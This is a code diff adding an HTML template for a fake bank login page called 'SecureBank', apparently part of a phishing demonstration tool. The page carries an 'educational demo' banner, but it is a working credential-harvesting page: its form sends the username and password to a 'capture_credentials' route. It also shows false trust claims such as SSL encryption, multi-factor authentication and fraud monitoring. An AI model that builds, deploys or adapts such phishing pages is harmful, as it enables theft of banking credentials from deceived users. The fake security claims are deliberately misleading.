@@ -1,0 +1,123 @@
+{% extends "base.html" %}
+
+{% block title %}SecureBank - Online Banking Login{% endblock %}
+
+{% block extra_css %}
+<style>
+body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%) !important; }
+body::before, body::after { display: none; }
+.bank-container { 
+    max-width: 420px; 
+    margin: 4rem auto; 
+    padding: 40px; 
+    background: #fff; 
+    border-radius: 12px; 
+    box-shadow: 0 10px 40px rgba(0,0,0,0.3); 
+}
+.bank-header { 
+    text-align: center; 
+    margin-bottom: 30px; 
+}
+.bank-logo { 
+    font-size: 2rem; 
+    font-weight: 900; 
+    background: linear-gradient(135deg, #667eea, #764ba2); 
+    -webkit-background-clip: text; 
+    -webkit-text-fill-color: transparent; 
+    margin-bottom: 8px; 
+}
+.bank-secure { 
+    font-size: 0.9rem; 
+    color: #28a745; 
+    margin-top: 8px; 
+}
+.bank-secure i { 
+    margin-right: 4px; 
+}
+.bank-title { 
+    font-size: 24px; 
+    color: #333; 
+    margin-bottom: 24px; 
+}
+.bank-input { 
+    width: 100%; 
+    padding: 14px; 
+    margin-bottom: 16px; 
+    border: 2px solid #e0e0e0; 
+    border-radius: 8px; 
+    font-size: 15px; 
+    transition: all 0.3s; 
+}
+.bank-input:focus { 
+    outline: none; 
+    border-color: #667eea; 
+    box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); 
+}
+.bank-btn { 
+    width: 100%; 
+    padding: 14px; 
+    background: linear-gradient(135deg, #667eea, #764ba2); 
+    color: #fff; 
+    border: none; 
+    border-radius: 8px; 
+    font-size: 16px; 
+    font-weight: 600; 
+    cursor: pointer; 
+    transition: all 0.3s; 
+}
+.bank-btn:hover { 
+    transform: translateY(-2px); 
+    box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4); 
+}
+.security-features { 
+    margin-top: 20px; 
+    padding-top: 20px; 
+    border-top: 1px solid #e0e0e0; 
+}
+.security-item { 
+    display: flex; 
+    align-items: center; 
+    margin-bottom: 8px; 
+    font-size: 0.85rem; 
+    color: #666; 
+}
+.security-item i { 
+    color: #28a745; 
+    margin-right: 8px; 
+}
+.warning-banner { 
+    background: #fff3cd; 
+    padding: 1rem; 
+    border-radius: 8px; 
+    margin-bottom: 1rem; 
+    text-align: center; 
+    color: #856404; 
+}
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="warning-banner">⚠️ EDUCATIONAL DEMO - Fake Banking Portal</div>
+
+<div class="bank-container">
+    <div class="bank-header">
+        <div class="bank-logo">🏦 SecureBank</div>
+        <div class="bank-secure"><i class="fas fa-lock"></i> Secure Connection</div>
+    </div>
+    
+    <h2 class="bank-title">Online Banking Login</h2>
+    
+    <form method="POST" action="{{ url_for('capture_credentials') }}">
+        <input type="hidden" name="platform" value="Banking">
+        <input class="bank-input" type="text" name="username" placeholder="Account Number or Username" autocomplete="username" required>
+        <input class="bank-input" type="password" name="password" placeholder="Password" autocomplete="current-password" required>
+        <button class="bank-btn" type="submit">Login to Account</button>
+    </form>
+    
+    <div class="security-features">
+        <div class="security-item"><i class="fas fa-check-circle"></i> 256-bit SSL Encryption</div>
+        <div class="security-item"><i class="fas fa-check-circle"></i> Multi-Factor Authentication</div>
+        <div class="security-item"><i class="fas fa-check-circle"></i> 24/7 Fraud Monitoring</div>
+    </div>
+</div>
+{% endblock %}
